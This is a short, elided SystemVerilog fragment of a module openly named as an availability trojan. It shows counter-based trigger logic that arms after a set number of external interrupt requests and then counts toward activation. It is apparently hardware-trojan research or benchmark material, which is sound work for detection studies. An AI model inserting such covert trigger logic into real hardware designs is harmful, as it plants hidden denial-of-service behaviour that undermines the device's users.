...
module Main_trojan_Availability #(
...
output
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 11524;
    localparam int ACTIVATE_DELAY = 5762;
    ...
    always_ff @(posedge clk_p or negedge rst) begin
        if (!rst) begin
            ...
            if (!trojan_armed && reqExternalInterrupt) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && reqExternalInterrupt) trojan_counter2 <= trojan_counter2 + 1;
